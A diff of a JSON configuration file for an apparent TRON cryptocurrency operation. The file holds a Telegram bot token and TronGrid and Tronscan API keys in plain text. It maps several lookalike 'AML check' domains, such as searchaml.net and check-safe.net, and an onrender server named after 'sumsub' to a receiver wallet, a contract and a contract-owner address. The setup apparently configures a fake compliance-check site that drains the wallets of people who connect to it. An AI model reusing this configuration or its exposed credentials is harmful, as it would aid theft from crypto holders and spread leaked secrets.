@@ -2,20 +2,13 @@
 	"ADMINS": [5502096260],
 	"SERVER_DOMAIN": "sumsub-7vj8.onrender.com",
 	"MIN_TRX_RESERVE": 15,
-	"TRONGRID_API_KEY": "e7766733-de62-4a20-96f7-fb9dd2a59952",
-	"TRONSCAN_API_KEY": "3206a58d-7601-4c05-af42-d7148c6e6392",
+	"TRONGRID_API_KEY": "27eb8192-1ff6-49ce-bdd9-8fb89dad48fe",
+	"TRONSCAN_API_KEY": "5e273246-4043-4f22-aab1-214ff1f4562f",
 	"TELEGRAM_TOKEN_ID": "8752204580:AAHRSPU-MjnsqgO_D0P4Ix38XdJvrabn5f0",
 	"SETTINGS": [
 		{
 			"id": 1,
-			"domains": [
-				"check-safe.net",
-				"api-scanaml.com",
-				"24swap1x.com",
-				"localhost",
-				"resonant-centaur-b6f76f.netlify.app",
-				"searchaml.net"
-			],
+			"domains": ["searchaml.net", "localhost"],
 			"receiverAddress": "TKCLaqY81yFbCDoqVXjNAr2SXCzWvyByFd",
 			"contractAddress": "TPYGqy5a6WsV7SWWTz41wX5wDSiYTD9tu4",
 			"contractOwnerAddress": "TJRVBw6t6nykuyUBd317c2Tzn7eV6G4mqZ",
@@ -30,7 +23,7 @@
 		},
 		{
 			"id": 2,
-			"domains": ["trustspay.org", "domain4.com", "searchaml.net"],
+			"domains": ["searchaml.net", "localhost"],
 			"receiverAddress": "TKCLaqY81yFbCDoqVXjNAr2SXCzWvyByFd",
 			"contractAddress": "TPYGqy5a6WsV7SWWTz41wX5wDSiYTD9tu4",
 			"contractOwnerAddress": "TJRVBw6t6nykuyUBd317c2Tzn7eV6G4mqZ",
